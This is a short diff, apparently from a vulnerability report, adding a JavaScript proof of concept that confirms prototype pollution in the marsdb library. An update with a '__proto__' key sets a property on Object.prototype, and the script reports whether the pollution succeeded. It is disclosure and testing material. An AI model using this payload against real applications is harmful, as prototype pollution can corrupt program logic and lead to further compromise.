@@ -1,0 +1,22 @@
+Confirmed the exploit works.
+
+```javascript
+const Collection = require("marsdb").default;
+
+const users = new Collection("users");
+
+users.insert({ _id: "victim", name: "alice" }).then(() => {
+  return users.update(
+    { _id: "victim" },
+    { $set: { "a.__proto__.polluted": "yes" } }
+  );
+}).then(() => {
+  const clean = {};
+  console.log("polluted value:", clean.polluted);
+  if (clean.polluted === "yes") {
+    console.log("Prototype pollution SUCCESSFUL: Object.prototype.polluted was set");
+  } else {
+    console.log("Prototype pollution failed");
+  }
+});
+```
